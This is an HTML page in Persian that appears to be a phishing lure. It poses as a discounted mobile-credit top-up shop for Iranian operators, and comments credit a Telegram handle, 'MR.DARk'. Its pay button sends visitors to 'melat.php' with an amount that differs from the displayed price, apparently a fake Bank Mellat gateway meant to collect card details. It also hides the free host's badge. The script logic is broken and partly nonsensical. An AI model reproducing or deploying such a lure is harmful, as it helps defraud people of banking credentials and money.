<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
  <meta charset="UTF-8">
  <meta name="viewport" , content="width=device-width" , initial-scale="1">
  <link href="" rel="stylesheet">
  <link href="../source/mci/css/font_irs.css" rel="stylesheet">
  <link href="../source/mci/css/style.css" rel="stylesheet">
  <title>شارژ ام سی آی</title>
</head>
<!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
<body>
<div class="container">
  <div class="title">
  <h2>شـــارژ ام سی آی</h2>
  </div>
  <div class="content">
    <div class="header">
      <h1>شارژ ایرانسل، همراه اول، رایتل و تالیا با تخفیف باور نکردنی</h1>
    </div>
    <div id="alert" class="alert" style="display: none">
    <p>لطفا شماره موبایل را درست وارد کنید</p>
    
    </div>
    <div class="forms">
      <form method="post">
        <div class="inlineform operator">
          <h4 class="priceselect">اپراتور  :</h4>
          <select class="forms" name="operator">
            <option value="1000">ایرانسل</option>
            <option value="2000">همراه اول</option>
            <option value="5000">رایتل</option>
            <option value="10000">تالیا</option>
          </select>
        </div>
        <div style="margin-top: 10px!important;" class="inlineform operator">
          <h4 class="priceselect">مــبلغ : </h4>
          <select onchange="changePrice()" id="price" class="forms" name="operator">
            <option value="1,500">۲۰۰۰ ( با تخفیف ۱۵۰۰ )</option>
            <option value="3,500">۵۰۰۰ ( با تخفیف ۳۵۰۰ )</option>
            <option value="7,500">۱۰۰۰۰ ( با تخفیف ۷۵۰۰ )</option>
            <option value="17,500">۲۰۰۰۰ ( با تخفیف ۱۷۵۰۰ )</option>
            <option value="42,500">۵۰۰۰۰ ( با تخفیف ۴۲۵۰۰ )</option>
          </select>
        </div><!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
        <div class="numb">
          <div class="numbers">
            <i><img src="../source/mci/images/phone.png" style="height: 20px; vertical-align: middle;"></i>
            <h2>همراه  :</h2>
            <input onfocus="removeAlert()" id="pnumber" type="text" name="tell" class="tell" maxlength="11" pattern="[0-9]{11}" placeholder="لطفا اعداد را انگلیسی وارد کنید">
            <span class="uinput">شماره همراه خود را وارد نمایید <span class="uniput2">(اجباری)</span></span><br>
            <div class="" style="margin-top: 15px">
              <i><img src="../source/mci/images/email.png" style="height: 20px; vertical-align: middle;"></i>
              <h2>ایمیل  :</h2>
              <input maxlength="30"
                placeholder="اختیاری"
                type="text"
                class="number"
                style="position: relative;
                left: 4px;" >
              <span class="uinput">لطفا ایمیل معتبری را وارد کنید <span class="uniputfree">(اختیاری)</span> </span><br>
           <!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
            </div><!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
          </div>
        </div><!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
        <div class="gopay">
          <div class="nerkh">
                        <h4>
              مبلغ پرداخت  :
              <span id="pay" class="price">1,500</span><span> تومان </span>
            </h4>
            </div>
            </div>
         <a href="melat.php?amount=50,000" class="button">پرداخت</a>
          </div>
          </div>
          </div>
          </div><!-- 	  @mrdarkmj = telegram coded by MR.DARk    -->
        </div>
      </form>
    </div>
  </div>
  <div>
    <img class="mark" src="../source/mci/images/1e5dab5a.png" alt="">
    <img class="mark" src="../source/mci/images/logo.aspx.png" alt="">
  </div>

</div>

<script>
function changePrice() {
  let price = document.getElementById("price").value;
  console.log(price);
  let pay = document.getElementById("pay");
  pay.innerHTML = price;
}

function payment() {
  let pnumber = document.getElementById("pnumber").value;
  console.log(pnumber);
  let link = document.getElementById("link");
  let pattern = /^(\+98|0)?9\d{9}$/;
  let alert = document.getElementById("alert");
  if(pattern.test(pnumber), price.value = "1/500"){
    link.href = "melat.php"
  }else if (pattern.test(pnumber) , price.value ="3/500"){
	link.href = "goog.com";
  }
}
 function removeAlert() {
   let alert = document.getElementById("alert");
   alert.style.display="none";

 }

</script>
<style>
		body {
			text-align: center;
			direction: rtl;
			font-family: tahoma;
		}
		
	a.button {
	margin-up: 30px;
	margin-right: 10px;
	margin-bottom: 30px;
	margin-left: 10px;
}
		
		a.button {
			display: inline-block;
			padding: 0.5em 2em;
			background-color: #00a950;
			color: #fff;
			text-decoration: none;
			border-radius: 0.9em;
			border-bottom: 2px solid #044;
		}
		
		a.button:hover {
			background-color: #0aa;
			border-bottom-color: #088;
		}
	</style>
</body>
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
</html>
